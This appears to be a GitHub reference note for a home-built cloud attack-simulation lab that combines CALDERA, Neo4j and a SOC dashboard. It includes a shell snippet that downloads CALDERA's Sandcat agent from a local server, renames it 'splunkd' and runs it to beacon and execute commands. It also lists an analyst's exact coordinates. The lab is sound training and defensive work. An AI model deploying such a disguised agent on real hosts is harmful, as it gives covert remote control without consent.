# GitHub Reference Notes

Last updated: 2026-04-02

This note captures the demo evidence shared in chat so the repository keeps a GitHub-friendly written reference even when the original screenshots are not stored in the workspace.

## Docker Image Snapshot

Local image inventory captured from Docker Desktop:

| Name | Tag | Image ID | Created | Size |
|------|-----|----------|---------|------|
| `cloud-attack-lab-neo4j-sync` | `latest` | `d9d361f3aa75` | 6 hours ago | 215.39 MB |
| `cloud-attack-lab-graph-writer` | `latest` | `9224919cfdc8` | 7 hours ago | 217.36 MB |
| `caldera` | `latest` | `6cef7f3dab5b` | 9 days ago | 7.08 GB |
| `neo4j` | `5-community` | `24b071534c7c` | 16 days ago | 983.65 MB |
| `redis` | `7-alpine` | `8b81dd37ff02` | 1 month ago | 61.16 MB |
| `cloud-attack-lab-dashboard` | `latest` | `51a6a9d52fff` | 9 minutes ago | 227.08 MB |

## Operation / Agent Evidence

Reference terminal flow captured from PowerShell + WSL:

```bash
cd \\wsl.localhost\Ubuntu-22.04\home\saketh\cloud-attack-lab
wsl
server="http://localhost:8888"
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \
  "$server/file/download" > splunkd
chmod +x splunkd
./splunkd -server $server -group red -v
```

Observed behavior from the captured run:

- Sandcat started in verbose mode.
- HTTP beacon channel was selected.
- The agent checked in as alive more than once.
- Instructions were received and executed.
- A `hostname` process was shown in the log.

## SOC Dashboard Reference

Captured dashboard state after the agent activity:

- Backend status reported CALDERA as connected at `http://caldera:8888`.
- Sync status was described as healthy across CALDERA and Neo4j.
- Dashboard counters showed `1` operation, `1` CALDERA agent, `1` Neo4j agent, and `1` alive agent.
- The graph view showed `2` nodes, `1` edge, and `1` attack path.
- The visible graph connected agent `honpfj` to observed fact `hostname`.
- Risk view was low, with the graph screenshot showing `LOW (3/100)`.

Attack path and defense side-panel references:

- Top path text showed `unknown | depth 1 | risk 9 | agent LENOVOSaketh (honpfj) | tech none`.
- Current attack focus highlighted Attack Path `#1` with guidance to prioritize scope, containment, and evidence preservation.
- Defense suggestions included reviewing host timeline, auth events, outbound traffic, local persistence, admin sessions, and reachable targets.
- Agent defense matrix highlighted agent `honpfj` with severity label `LOW 14`.

## Geospatial View Reference

The shared geospatial screenshot showed:

- `1` tracked agent and `1` mappable agent.
- Analyst console location resolved from place search.
- Analyst coordinates displayed as `17.3383467, 78.5222127`.
- Agent `LENOVOSaketh` was mapped near the analyst-console location.
- The UI correctly warned that markers may be approximate for private or WSL addresses.

## Learning Views Reference

Maze view notes:

- The page title was "Cloud Attack Path Simulator - Interactive Maze".
- The mission focused on clearing the attack path like a defender, not a shell operator.
- The visible objective was to clear each threat node using the right defensive move sequence.
- The UI exposed mission loop, live coaching, ability deck, advanced console, and embedded CTF actions.

CTF view notes:

- The CTF screen showed "Level 1 (Easy)".
- Operator, score, attempts, and topic chips were visible.
- The challenge prompt asked which command quickly confirms the current active user context on a compromised Linux host.
- The tutor panel showed preset actions such as `Hi`, `Explain`, and `Hint`.

## Suggested GitHub Usage

This page is intended as a quick reviewer/reference note for:

- proving the Docker images that backed the demo,
- showing that a CALDERA agent checked in and executed commands,
- documenting the resulting dashboard attack-path and defense views,
- and recording the newer Maze and CTF learning surfaces.
